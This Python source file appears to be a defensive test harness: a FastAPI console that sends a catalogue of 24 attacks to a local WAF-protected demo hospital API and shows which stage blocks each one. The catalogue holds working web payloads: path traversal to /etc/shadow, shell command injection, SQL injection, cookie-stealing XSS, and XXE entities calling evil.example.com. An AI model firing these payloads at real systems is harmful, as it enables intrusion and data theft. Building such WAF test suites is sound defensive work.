"""Standalone Live Attack Console & WAF Pipeline Visualizer.

Runs on host machine (outside Docker Compose) on port 9000.
Talks to the WAF / Nginx stack at http://localhost:80 (or http://localhost:8000)
and live-tails logs/waf.log via Server-Sent Events (SSE).
"""
import asyncio
import json
import os
import time
from typing import Dict, Any, List, Optional
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
import httpx
import uvicorn

from console.raw_socket_client import RawSocketClient

app = FastAPI(title="WAF Live Attack Console & Pipeline Visualizer", version="1.0.0")

# Configuration
TARGET_BASE_URL = os.getenv("TARGET_BASE_URL", "http://127.0.0.1:80").rstrip("/")
TARGET_HOST = os.getenv("TARGET_HOST", "127.0.0.1")
TARGET_PORT = int(os.getenv("TARGET_PORT", "80"))
LOG_FILE_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs", "waf.log")

# Raw socket client for byte-level evasion tests
raw_socket = RawSocketClient(host=TARGET_HOST, port=TARGET_PORT)


# ==============================================================================
# Full Attack Matrix Definition (§4)
# ==============================================================================
ATTACK_MATRIX = [
    {
        "id": 1,
        "name": "Normal Baseline Request",
        "stage": "PASSED",
        "category": "Baseline",
        "endpoint": "/api/patients",
        "method": "GET",
        "expected_stage": "PASSED",
        "expected_rule": "-",
        "expected_status": 200,
        "description": "Legitimate patient list query without payload.",
        "payload": "None",
        "sender": "httpx",
    },
    {
        "id": 2,
        "name": "Standard Path Traversal (../)",
        "stage": "URL_INSPECTOR",
        "category": "Path Traversal",
        "endpoint": "/records/download?file=../../etc/passwd",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "PT-001",
        "expected_status": 403,
        "description": "Direct dot-dot-slash directory traversal.",
        "payload": "file=../../etc/passwd",
        "sender": "httpx",
    },
    {
        "id": 3,
        "name": "Single URL-Encoded Traversal (%2e%2e%2f)",
        "stage": "URL_INSPECTOR",
        "category": "Path Traversal",
        "endpoint": "/records/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "PT-002",
        "expected_status": 403,
        "description": "Percent-encoded directory traversal sequence.",
        "payload": "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "sender": "httpx",
    },
    {
        "id": 4,
        "name": "Double URL-Encoded Traversal (%252e%252e%252f)",
        "stage": "URL_INSPECTOR",
        "category": "Path Traversal",
        "endpoint": "/records/download?file=%252e%252e%252fetc%252fpasswd",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "PT-003",
        "expected_status": 403,
        "description": "Nested double-encoded evasion string.",
        "payload": "file=%252e%252e%252fetc%252fpasswd",
        "sender": "httpx",
    },
    {
        "id": 5,
        "name": "Unix Sensitive File Target (/etc/shadow)",
        "stage": "URL_INSPECTOR",
        "category": "Path Traversal",
        "endpoint": "/records/download?file=/etc/shadow",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "PT-004",
        "expected_status": 403,
        "description": "Direct reference to sensitive Unix system credential file.",
        "payload": "file=/etc/shadow",
        "sender": "httpx",
    },
    {
        "id": 6,
        "name": "Windows Sensitive File Target (cmd.exe)",
        "stage": "URL_INSPECTOR",
        "category": "Path Traversal",
        "endpoint": "/records/download?file=windows/system32/cmd.exe",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "PT-005",
        "expected_status": 403,
        "description": "Targeting Windows System32 executable.",
        "payload": "file=windows/system32/cmd.exe",
        "sender": "httpx",
    },
    {
        "id": 7,
        "name": "Environment Config Target (.env)",
        "stage": "URL_INSPECTOR",
        "category": "Path Traversal",
        "endpoint": "/records/download?file=.env",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "PT-006",
        "expected_status": 403,
        "description": "Probing for secret environment variables.",
        "payload": "file=.env",
        "sender": "httpx",
    },
    {
        "id": 8,
        "name": "Null Byte Injection (%00)",
        "stage": "URL_INSPECTOR",
        "category": "Evasion",
        "endpoint": "/records/download?file=avatar.png%00.php",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "NB-001",
        "expected_status": 403,
        "description": "Null byte poisoning for file extension truncation.",
        "payload": "file=avatar.png%00.php",
        "sender": "httpx",
    },
    {
        "id": 9,
        "name": "Command Injection in Query Parameter",
        "stage": "URL_INSPECTOR",
        "category": "Command Injection",
        "endpoint": "/api/billing/lookup?insurance_id=test;cat%20/etc/passwd",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "CI-001",
        "expected_status": 403,
        "description": "Command chaining operator followed by Unix cat command.",
        "payload": "insurance_id=test;cat /etc/passwd",
        "sender": "httpx",
    },
    {
        "id": 10,
        "name": "Subshell Command Injection in Form Body",
        "stage": "BODY_INSPECTOR",
        "category": "Command Injection",
        "endpoint": "/api/appointments",
        "method": "POST",
        "expected_stage": "BODY_INSPECTOR",
        "expected_rule": "CI-002",
        "expected_status": 403,
        "description": "Subshell command substitution syntax $(whoami) in appointment reason.",
        "payload": "patient_mrn=MRN-10234&date=2026-09-10&reason=$(whoami)",
        "content_type": "application/x-www-form-urlencoded",
        "sender": "httpx",
    },
    {
        "id": 11,
        "name": "UNION SELECT SQL Injection in Query",
        "stage": "URL_INSPECTOR",
        "category": "SQL Injection",
        "endpoint": "/api/patients?q=1%20UNION%20SELECT%20username,password%20FROM%20users",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "SQL-001",
        "expected_status": 403,
        "description": "Classic UNION based SQL injection in patient search query.",
        "payload": "q=1 UNION SELECT username,password FROM users",
        "sender": "httpx",
    },
    {
        "id": 12,
        "name": "Tautology SQL Injection in Login JSON",
        "stage": "BODY_INSPECTOR",
        "category": "SQL Injection",
        "endpoint": "/api/login",
        "method": "POST",
        "expected_stage": "BODY_INSPECTOR",
        "expected_rule": "SQL-002",
        "expected_status": 403,
        "description": "Boolean tautology ' OR 1=1-- payload inside JSON authentication body.",
        "payload": json.dumps({"username": "admin' OR 1=1--", "password": "x"}),
        "content_type": "application/json",
        "sender": "httpx",
    },
    {
        "id": 13,
        "name": "Time-Based SQL Injection (SLEEP)",
        "stage": "URL_INSPECTOR",
        "category": "SQL Injection",
        "endpoint": "/api/billing/lookup?insurance_id=1%20OR%20SLEEP(5)",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "SQL-003",
        "expected_status": 403,
        "description": "Time-delay stacked SQL injection function.",
        "payload": "insurance_id=1 OR SLEEP(5)",
        "sender": "httpx",
    },
    {
        "id": 14,
        "name": "Reflected Script Tag XSS in Query",
        "stage": "URL_INSPECTOR",
        "category": "Cross-Site Scripting",
        "endpoint": "/api/patients?q=<script>alert(1)</script>",
        "method": "GET",
        "expected_stage": "URL_INSPECTOR",
        "expected_rule": "XSS-001",
        "expected_status": 403,
        "description": "Direct HTML script element in search parameter.",
        "payload": "q=<script>alert(1)</script>",
        "sender": "httpx",
    },
    {
        "id": 15,
        "name": "JavaScript URI Scheme XSS in Note JSON",
        "stage": "BODY_INSPECTOR",
        "category": "Cross-Site Scripting",
        "endpoint": "/api/patients/MRN-10234/notes",
        "method": "POST",
        "expected_stage": "BODY_INSPECTOR",
        "expected_rule": "XSS-002",
        "expected_status": 403,
        "description": "javascript: pseudo-protocol embedded in patient clinical note.",
        "payload": json.dumps({"note": '<a href="javascript:alert(document.cookie)">click</a>'}),
        "content_type": "application/json",
        "sender": "httpx",
    },
    {
        "id": 16,
        "name": "Dangerous Iframe XSS in Note JSON",
        "stage": "BODY_INSPECTOR",
        "category": "Cross-Site Scripting",
        "endpoint": "/api/patients/MRN-10234/notes",
        "method": "POST",
        "expected_stage": "BODY_INSPECTOR",
        "expected_rule": "XSS-003",
        "expected_status": 403,
        "description": "Iframe injection payload inside patient chart update.",
        "payload": json.dumps({"note": '<iframe src="http://evil.example.com/steal"></iframe>'}),
        "content_type": "application/json",
        "sender": "httpx",
    },
    {
        "id": 17,
        "name": "XML External Entity (XXE) Lab Import",
        "stage": "BODY_INSPECTOR",
        "category": "XXE Injection",
        "endpoint": "/api/lab-reports/import",
        "method": "POST",
        "expected_stage": "BODY_INSPECTOR",
        "expected_rule": "XXE-001",
        "expected_status": 403,
        "description": "DOCTYPE ENTITY SYSTEM declaration referencing local /etc/passwd.",
        "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
        "content_type": "application/xml",
        "sender": "httpx",
    },
    {
        "id": 18,
        "name": "XML Parameter Entity Injection",
        "stage": "BODY_INSPECTOR",
        "category": "XXE Injection",
        "endpoint": "/api/lab-reports/import",
        "method": "POST",
        "expected_stage": "BODY_INSPECTOR",
        "expected_rule": "XXE-001",
        "expected_status": 403,
        "description": "XML Parameter entity expansion technique targeting external DTD.",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example.com/evil.dtd"> %xxe;]><foo></foo>',
        "content_type": "application/xml",
        "sender": "httpx",
    },
    {
        "id": 19,
        "name": "Automated Vulnerability Scanner User-Agent",
        "stage": "HEADER_VALIDATOR",
        "category": "Header Validation",
        "endpoint": "/api/patients",
        "method": "GET",
        "expected_stage": "HEADER_VALIDATOR",
        "expected_rule": "UA-BLOCK",
        "expected_status": 403,
        "description": "Identified sqlmap scanner user-agent signature.",
        "payload": "User-Agent: sqlmap/1.6-dev",
        "headers": {"User-Agent": "sqlmap/1.6-dev"},
        "sender": "httpx",
    },
    {
        "id": 20,
        "name": "Missing Required User-Agent Header",
        "stage": "HEADER_VALIDATOR",
        "category": "Protocol / Header",
        "endpoint": "/api/patients",
        "method": "GET",
        "expected_stage": "HEADER_VALIDATOR",
        "expected_rule": "HEADER-VALIDATION",
        "expected_status": 403,
        "description": "HTTP request with User-Agent header completely omitted (Raw Socket).",
        "payload": "User-Agent Header Omitted via Raw Socket",
        "sender": "raw_socket_missing_ua",
    },
    {
        "id": 21,
        "name": "CRLF / HTTP Header Splitting Injection",
        "stage": "HEADER_VALIDATOR",
        "category": "Protocol / Header",
        "endpoint": "/api/patients",
        "method": "GET",
        "expected_stage": "HEADER_VALIDATOR",
        "expected_rule": "HI-001",
        "expected_status": 403,
        "description": "Literal \\r\\n carriage-return sequence in header value (Raw Socket).",
        "payload": "X-Referral: a\\r\\nSet-Cookie: admin=true",
        "sender": "raw_socket_crlf",
    },
    {
        "id": 22,
        "name": "Mismatched Content-Length Header",
        "stage": "HEADER_VALIDATOR",
        "category": "Protocol / Header",
        "endpoint": "/api/login",
        "method": "POST",
        "expected_stage": "HEADER_VALIDATOR",
        "expected_rule": "HEADER-VALIDATION",
        "expected_status": 403,
        "description": "Header specifies 100 bytes but only 15 bytes sent (Raw Socket).",
        "payload": "Content-Length: 100 (Actual: 15)",
        "sender": "raw_socket_mismatch_cl",
    },
    {
        "id": 23,
        "name": "Rate Limit Burst Exhaustion (25 Rapid Requests)",
        "stage": "RATE_LIMITER",
        "category": "Rate Limiter",
        "endpoint": "/api/patients",
        "method": "GET",
        "expected_stage": "RATE_LIMITER",
        "expected_rule": "RATE-LIMIT",
        "expected_status": 429,
        "description": "25 rapid concurrent requests exhausting token bucket capacity.",
        "payload": "25 x Rapid GET /api/patients",
        "sender": "rate_limit_burst",
    },
    {
        "id": 24,
        "name": "Stage-1 IP Filtering (Client IP Blocklist)",
        "stage": "IP_FILTER",
        "category": "IP Filter",
        "endpoint": "/api/patients",
        "method": "GET",
        "expected_stage": "IP_FILTER",
        "expected_rule": "IP-FILTER",
        "expected_status": 403,
        "description": "Triggered when IP is in WAF_IP_BLOCKLIST (Executed via demo/block_my_ip.sh).",
        "payload": "CIDR Blocklist Evaluation",
        "sender": "httpx",
    },
]


# ==============================================================================
# Helper Execution Dispatcher
# ==============================================================================
async def execute_attack_row(item: Dict[str, Any]) -> Dict[str, Any]:
    """Dispatches attack request to target stack and returns standardized result."""
    sender_type = item.get("sender", "httpx")
    start_time = time.time()

    if sender_type == "raw_socket_missing_ua":
        res = raw_socket.test_missing_user_agent(item["endpoint"])
        latency = round((time.time() - start_time) * 1000, 1)
        data = res.get("json", {})
        return {
            "status_code": res["status_code"],
            "stage": data.get("stage", "UNKNOWN"),
            "rule_id": data.get("rule_id", "UNKNOWN"),
            "reason": data.get("reason", data.get("message", "")),
            "latency_ms": latency,
            "raw_response": res.get("body", ""),
            "json": data,
        }

    elif sender_type == "raw_socket_crlf":
        res = raw_socket.test_crlf_header_injection(item["endpoint"])
        latency = round((time.time() - start_time) * 1000, 1)
        data = res.get("json", {})
        return {
            "status_code": res["status_code"],
            "stage": data.get("stage", "UNKNOWN"),
            "rule_id": data.get("rule_id", "UNKNOWN"),
            "reason": data.get("reason", data.get("message", "")),
            "latency_ms": latency,
            "raw_response": res.get("body", ""),
            "json": data,
        }

    elif sender_type == "raw_socket_mismatch_cl":
        res = raw_socket.test_content_length_mismatch(item["endpoint"])
        latency = round((time.time() - start_time) * 1000, 1)
        data = res.get("json", {})
        return {
            "status_code": res["status_code"],
            "stage": data.get("stage", "UNKNOWN"),
            "rule_id": data.get("rule_id", "UNKNOWN"),
            "reason": data.get("reason", data.get("message", "")),
            "latency_ms": latency,
            "raw_response": res.get("body", ""),
            "json": data,
        }

    elif sender_type == "rate_limit_burst":
        last_res = None
        hit_429 = False
        allowed_count = 0
        blocked_count = 0
        async with httpx.AsyncClient(timeout=10.0) as client:
            for i in range(25):
                try:
                    r = await client.get(
                        f"{TARGET_BASE_URL}/api/patients?burst={i}",
                        headers={"Host": "localhost", "User-Agent": "Mozilla/5.0"}
                    )
                    if r.status_code == 200:
                        allowed_count += 1
                    elif r.status_code == 429:
                        blocked_count += 1
                        hit_429 = True
                        last_res = r
                except Exception:
                    pass

        latency = round((time.time() - start_time) * 1000, 1)
        data = last_res.json() if (last_res and last_res.headers.get("content-type", "").startswith("application/json")) else {}
        return {
            "status_code": 429 if hit_429 else 200,
            "stage": "RATE_LIMITER" if hit_429 else "PASSED",
            "rule_id": "RATE-LIMIT" if hit_429 else "-",
            "reason": f"Burst test: {allowed_count} passed, {blocked_count} throttled (429)",
            "latency_ms": latency,
            "json": data or {"allowed_burst": allowed_count, "throttled": blocked_count},
        }

    else:
        # Standard HTTPX client execution
        headers = {"Host": "localhost", "User-Agent": "Mozilla/5.0"}
        if "headers" in item:
            headers.update(item["headers"])
        if "content_type" in item:
            headers["Content-Type"] = item["content_type"]

        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                url = f"{TARGET_BASE_URL}{item['endpoint']}"
                if item["method"] == "GET":
                    resp = await client.get(url, headers=headers)
                elif item["method"] == "POST":
                    resp = await client.post(url, headers=headers, content=item.get("payload", "").encode("utf-8"))
                else:
                    resp = await client.request(item["method"], url, headers=headers)

                latency = round((time.time() - start_time) * 1000, 1)
                data = {}
                try:
                    data = resp.json()
                except Exception:
                    data = {"text": resp.text[:200]}

                return {
                    "status_code": resp.status_code,
                    "stage": data.get("stage", "PASSED" if resp.status_code == 200 else "BLOCKED"),
                    "rule_id": data.get("rule_id", "-" if resp.status_code == 200 else "DETECTED"),
                    "reason": data.get("reason", data.get("message", "OK" if resp.status_code == 200 else "")),
                    "latency_ms": latency,
                    "json": data,
                }
            except Exception as e:
                return {
                    "status_code": 0,
                    "stage": "NETWORK_ERROR",
                    "rule_id": "CONN-ERR",
                    "reason": str(e),
                    "latency_ms": 0,
                    "json": {"error": str(e)},
                }


# ==============================================================================
# API Endpoints
# ==============================================================================
@app.post("/api/execute/{attack_id}")
async def api_execute_attack(attack_id: int):
    """Executes a specific attack row from the matrix."""
    item = next((row for row in ATTACK_MATRIX if row["id"] == attack_id), None)
    if not item:
        return JSONResponse(status_code=404, content={"error": "Attack ID not found"})

    result = await execute_attack_row(item)
    return {
        "attack": item,
        "result": result
    }


@app.get("/api/attacks")
async def api_list_attacks():
    """Returns the complete attack matrix catalog."""
    return {"matrix": ATTACK_MATRIX}


@app.get("/api/logs/stream")
async def stream_logs(request: Request):
    """Server-Sent Events (SSE) endpoint live tailing logs/waf.log."""
    async def log_generator():
        # Ensure log directory exists
        os.makedirs(os.path.dirname(LOG_FILE_PATH), exist_ok=True)
        if not os.path.exists(LOG_FILE_PATH):
            open(LOG_FILE_PATH, "a").close()

        with open(LOG_FILE_PATH, "r", encoding="utf-8") as f:
            # Seek to end on startup
            f.seek(0, os.SEEK_END)
            while True:
                if await request.is_disconnected():
                    break
                line = f.readline()
                if line and line.strip():
                    try:
                        parsed = json.loads(line.strip())
                        yield f"data: {json.dumps(parsed)}\n\n"
                    except Exception:
                        yield f"data: {json.dumps({'raw': line.strip()})}\n\n"
                else:
                    await asyncio.sleep(0.5)

    return StreamingResponse(log_generator(), media_type="text/event-stream")


# ==============================================================================
# HTML Interface: 3-Panel WAF Visualizer & Attack Cockpit
# ==============================================================================
@app.get("/", response_class=HTMLResponse)
async def console_ui():
    matrix_json = json.dumps(ATTACK_MATRIX)
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAF Live Attack Console & Pipeline Visualizer</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        body {{ background-color: #030712; color: #94a3b8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; }}
        .navbar-custom {{ background-color: #0b0f19; border-bottom: 1px solid #1f2937; }}
        .card-custom {{ background-color: #0b0f19; border: 1px solid #1f2937; border-radius: 8px; }}
        
        /* Pipeline Visualizer */
        .pipeline-container {{ display: flex; align-items: center; justify-content: space-between; padding: 20px; overflow-x: auto; }}
        .pipe-node {{ display: flex; flex-direction: column; align-items: center; justify-content: center; min-width: 110px; padding: 10px 8px; border-radius: 8px; border: 1px solid #374151; background: #111827; font-size: 0.75rem; text-align: center; transition: all 0.3s ease; }}
        .pipe-node i {{ font-size: 1.2rem; margin-bottom: 4px; }}
        .pipe-arrow {{ color: #4b5563; font-size: 1rem; margin: 0 4px; }}
        
        /* Node states */
        .node-active-green {{ border-color: #10b981 !important; background: #064e3b !important; color: #a7f3d0 !important; box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); }}
        .node-blocked-red {{ border-color: #ef4444 !important; background: #7f1d1d !important; color: #fecaca !important; box-shadow: 0 0 15px rgba(239, 68, 68, 0.5); }}
        .node-dimmed {{ opacity: 0.25; filter: grayscale(1); }}
        
        /* Logs Table */
        .table-logs {{ font-size: 0.75rem; font-family: 'Courier New', Courier, monospace; }}
        .table-logs th {{ color: #64748b; font-weight: 600; border-bottom: 1px solid #1f2937; }}
        .table-logs td {{ border-bottom: 1px solid #111827; padding: 6px 8px; }}
        .logs-scroll {{ max-height: 280px; overflow-y: auto; background-color: #020617; border-radius: 6px; border: 1px solid #1e293b; }}
        
        /* Attack buttons */
        .attack-row {{ transition: background 0.15s ease; border-bottom: 1px solid #1f2937; }}
        .attack-row:hover {{ background-color: #111827; }}
        .badge-stage {{ font-size: 0.7rem; font-weight: 600; }}
        .json-viewer {{ background-color: #020617; border: 1px solid #1e293b; border-radius: 6px; padding: 10px; font-family: monospace; font-size: 0.75rem; color: #38bdf8; max-height: 160px; overflow-y: auto; }}
    </style>
</head>
<body class="py-3">
    <div class="container-fluid px-4">
        <!-- Top Navbar -->
        <div class="d-flex justify-content-between align-items-center mb-3 pb-2 border-bottom border-secondary border-opacity-25">
            <div class="d-flex align-items-center">
                <i class="fa-solid fa-gauge-circle-bolt text-info fs-3 me-3"></i>
                <div>
                    <h4 class="mb-0 text-white fw-bold">WAF Protocol & Security Attack Cockpit</h4>
                    <small class="text-secondary">Deterministic Layer-7 Interception Gateway &bull; Live Telemetry & Inspector Visualizer</small>
                </div>
            </div>
            <div class="d-flex gap-2 align-items-center">
                <span class="badge bg-secondary py-2 px-3"><i class="fa-solid fa-server me-1"></i> Target: <code class="text-info">{TARGET_BASE_URL}</code></span>
                <button class="btn btn-sm btn-outline-danger" onclick="runAllSequential()"><i class="fa-solid fa-play-circle me-1"></i> Run Full Matrix (24 Tests)</button>
            </div>
        </div>

        <!-- Panel 1: Live Pipeline Visualizer -->
        <div class="card card-custom mb-3 p-3">
            <div class="d-flex justify-content-between align-items-center mb-1">
                <span class="text-white small fw-bold"><i class="fa-solid fa-diagram-project text-warning me-2"></i>Deterministic 5-Stage Pipeline State:</span>
                <span id="pipelineStatusText" class="badge bg-dark text-secondary">Idle (Waiting for test execution)</span>
            </div>
            <div class="pipeline-container">
                <!-- Client -->
                <div class="pipe-node" id="nodeClient"><i class="fa-solid fa-laptop text-info"></i><span>Client</span></div>
                <i class="fa-solid fa-chevron-right pipe-arrow"></i>
                <!-- Nginx -->
                <div class="pipe-node" id="nodeNginx"><i class="fa-solid fa-network-wired text-success"></i><span>Tier 1: Nginx</span><small class="text-muted">:80</small></div>
                <i class="fa-solid fa-chevron-right pipe-arrow"></i>
                <!-- Stage 1 IP -->
                <div class="pipe-node" id="nodeStage1"><i class="fa-solid fa-filter"></i><span>Stage 1: IP</span><small class="text-muted">CIDR List</small></div>
                <i class="fa-solid fa-chevron-right pipe-arrow"></i>
                <!-- Stage 2 Rate -->
                <div class="pipe-node" id="nodeStage2"><i class="fa-solid fa-gauge-high"></i><span>Stage 2: Rate</span><small class="text-muted">Token Bucket</small></div>
                <i class="fa-solid fa-chevron-right pipe-arrow"></i>
                <!-- Stage 3 Header -->
                <div class="pipe-node" id="nodeStage3"><i class="fa-solid fa-heading"></i><span>Stage 3: Header</span><small class="text-muted">RFC / CRLF</small></div>
                <i class="fa-solid fa-chevron-right pipe-arrow"></i>
                <!-- Stage 4 URL -->
                <div class="pipe-node" id="nodeStage4"><i class="fa-solid fa-link"></i><span>Stage 4: URL</span><small class="text-muted">Traversal / Dec</small></div>
                <i class="fa-solid fa-chevron-right pipe-arrow"></i>
                <!-- Stage 5 Body -->
                <div class="pipe-node" id="nodeStage5"><i class="fa-solid fa-file-code"></i><span>Stage 5: Body</span><small class="text-muted">JSON/XML/XXE</small></div>
                <i class="fa-solid fa-chevron-right pipe-arrow"></i>
                <!-- Backend -->
                <div class="pipe-node" id="nodeBackend"><i class="fa-solid fa-hospital-user text-primary"></i><span>Tier 3: Backend</span><small class="text-muted">:8080 (Isolated)</small></div>
            </div>

            <!-- Last Response Inspection Data -->
            <div class="row g-2 mt-1">
                <div class="col-md-6">
                    <small class="text-secondary fw-bold d-block mb-1">Live HTTP Response Payload:</small>
                    <pre class="json-viewer mb-0" id="responseViewer">// Execute any attack below to inspect JSON response...</pre>
                </div>
                <div class="col-md-6">
                    <small class="text-secondary fw-bold d-block mb-1">WAF Forensic Security Decision:</small>
                    <pre class="json-viewer mb-0" id="decisionViewer">// Matching forensic log line...</pre>
                </div>
            </div>
        </div>

        <!-- Row: Panel 2 (Canned Attacks) & Panel 3 (Live Log Tail) -->
        <div class="row g-3">
            <!-- Panel 2: Attack Library -->
            <div class="col-lg-7">
                <div class="card card-custom p-3 h-100">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <span class="text-white small fw-bold"><i class="fa-solid fa-crosshairs text-danger me-2"></i>Canned Attack Matrix Library (24 Scenarios)</span>
                        <div class="btn-group btn-group-sm">
                            <button class="btn btn-outline-secondary active" onclick="filterCategory('ALL')">All</button>
                            <button class="btn btn-outline-secondary" onclick="filterCategory('Path Traversal')">Traversal</button>
                            <button class="btn btn-outline-secondary" onclick="filterCategory('SQL Injection')">SQLi</button>
                            <button class="btn btn-outline-secondary" onclick="filterCategory('Cross-Site Scripting')">XSS</button>
                            <button class="btn btn-outline-secondary" onclick="filterCategory('XXE Injection')">XXE</button>
                            <button class="btn btn-outline-secondary" onclick="filterCategory('Protocol / Header')">Header/CRLF</button>
                        </div>
                    </div>

                    <div style="max-height: 520px; overflow-y: auto;">
                        <table class="table table-dark table-sm align-middle mb-0" style="font-size: 0.78rem;">
                            <thead>
                                <tr class="text-secondary">
                                    <th>#</th>
                                    <th>Attack Scenario</th>
                                    <th>Target Endpoint & Payload</th>
                                    <th>Expected Rule</th>
                                    <th>Status</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody id="attackMatrixBody"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- Panel 3: Live Audit Log Tail -->
            <div class="col-lg-5">
                <div class="card card-custom p-3 h-100">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <span class="text-white small fw-bold"><i class="fa-solid fa-file-waveform text-success me-2"></i>Live Audit Log Stream (<code>waf.log</code>)</span>
                        <span class="badge bg-success bg-opacity-25 text-success small"><i class="fa-solid fa-circle-dot fa-fade me-1"></i> SSE LIVE</span>
                    </div>

                    <div class="logs-scroll p-2 mb-2" style="height: 480px;">
                        <table class="table table-logs table-dark table-hover mb-0">
                            <thead>
                                <tr>
                                    <th>TIME</th>
                                    <th>METHOD</th>
                                    <th>STAGE</th>
                                    <th>RULE</th>
                                    <th>ACTION</th>
                                    <th>STATUS</th>
                                </tr>
                            </thead>
                            <tbody id="liveLogTbody">
                                <tr><td colspan="6" class="text-secondary text-center py-4">// Awaiting new security log events...</td></tr>
                            </tbody>
                        </table>
                    </div>
                    <div class="d-flex justify-content-between small text-secondary">
                        <span>Host File: <code>logs/waf.log</code></span>
                        <button class="btn btn-xs btn-outline-secondary py-0 px-2" onclick="document.getElementById('liveLogTbody').innerHTML=''">Clear View</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const MATRIX = {matrix_json};
        let activeFilter = 'ALL';

        function renderMatrix() {{
            const tbody = document.getElementById('attackMatrixBody');
            tbody.innerHTML = '';

            MATRIX.forEach(item => {{
                if (activeFilter !== 'ALL' && item.category !== activeFilter) return;

                let stageBadge = '<span class="badge bg-secondary badge-stage">' + item.stage + '</span>';
                if (item.stage === 'PASSED') stageBadge = '<span class="badge bg-success badge-stage">PASSED</span>';
                if (item.stage === 'URL_INSPECTOR') stageBadge = '<span class="badge bg-danger badge-stage">URL_INSP</span>';
                if (item.stage === 'BODY_INSPECTOR') stageBadge = '<span class="badge bg-danger badge-stage">BODY_INSP</span>';
                if (item.stage === 'HEADER_VALIDATOR') stageBadge = '<span class="badge bg-warning text-dark badge-stage">HEADER</span>';
                if (item.stage === 'RATE_LIMITER') stageBadge = '<span class="badge bg-warning text-dark badge-stage">RATE_LIMIT</span>';
                if (item.stage === 'IP_FILTER') stageBadge = '<span class="badge bg-danger badge-stage">IP_FILTER</span>';

                tbody.innerHTML += `
                    <tr class="attack-row" id="row-${{item.id}}">
                        <td class="text-secondary fw-bold">${{item.id}}</td>
                        <td>
                            <div class="fw-bold text-white">${{item.name}}</div>
                            <small class="text-secondary" style="font-size:0.7rem;">${{item.description}}</small>
                        </td>
                        <td>
                            <div><span class="badge bg-dark text-info">${{item.method}}</span> <code class="text-white">${{item.endpoint}}</code></div>
                            <div class="text-truncate text-secondary" style="max-width: 220px; font-size: 0.68rem;">${{item.payload}}</div>
                        </td>
                        <td><code class="text-warning">${{item.expected_rule}}</code></td>
                        <td id="status-cell-${{item.id}}"><span class="badge bg-dark text-secondary">Ready</span></td>
                        <td>
                            <button class="btn btn-sm btn-outline-danger py-0 px-2" onclick="fireAttack(${{item.id}})">
                                <i class="fa-solid fa-play"></i> Fire
                            </button>
                        </td>
                    </tr>
                `;
            }});
        }}

        function filterCategory(cat) {{
            activeFilter = cat;
            renderMatrix();
        }}

        function resetPipeline() {{
            ['nodeClient', 'nodeNginx', 'nodeStage1', 'nodeStage2', 'nodeStage3', 'nodeStage4', 'nodeStage5', 'nodeBackend'].forEach(id => {{
                document.getElementById(id).className = 'pipe-node';
            }});
        }}

        function updatePipelineVisualization(stage, isAllowed, statusCode, ruleId) {{
            resetPipeline();
            const nodes = ['nodeClient', 'nodeNginx', 'nodeStage1', 'nodeStage2', 'nodeStage3', 'nodeStage4', 'nodeStage5', 'nodeBackend'];
            
            document.getElementById('nodeClient').classList.add('node-active-green');
            document.getElementById('nodeNginx').classList.add('node-active-green');

            const statusEl = document.getElementById('pipelineStatusText');

            if (isAllowed || stage === 'PASSED') {{
                nodes.forEach(id => document.getElementById(id).classList.add('node-active-green'));
                statusEl.className = 'badge bg-success';
                statusEl.innerText = 'STATUS 200 OK — PASSED ALL 5 STAGES & REACHED BACKEND';
                return;
            }}

            const stageMap = {{
                'IP_FILTER': 'nodeStage1',
                'RATE_LIMITER': 'nodeStage2',
                'HEADER_VALIDATOR': 'nodeStage3',
                'URL_INSPECTOR': 'nodeStage4',
                'BODY_INSPECTOR': 'nodeStage5'
            }};

            const stopNodeId = stageMap[stage] || 'nodeStage3';
            let stopped = false;

            for (let id of ['nodeStage1', 'nodeStage2', 'nodeStage3', 'nodeStage4', 'nodeStage5', 'nodeBackend']) {{
                if (!stopped) {{
                    if (id === stopNodeId) {{
                        document.getElementById(id).classList.add('node-blocked-red');
                        stopped = true;
                    }} else {{
                        document.getElementById(id).classList.add('node-active-green');
                    }}
                }} else {{
                    document.getElementById(id).classList.add('node-dimmed');
                }}
            }}

            statusEl.className = 'badge bg-danger';
            statusEl.innerText = `BLOCKED AT ${{stage}} (Rule: ${{ruleId || 'N/A'}}) — HTTP ${{statusCode}}`;
        }}

        async function fireAttack(id) {{
            const statusCell = document.getElementById('status-cell-' + id);
            statusCell.innerHTML = '<span class="spinner-border spinner-border-sm text-info"></span>';

            try {{
                const res = await fetch('/api/execute/' + id, {{ method: 'POST' }});
                const data = await res.json();
                const r = data.result;

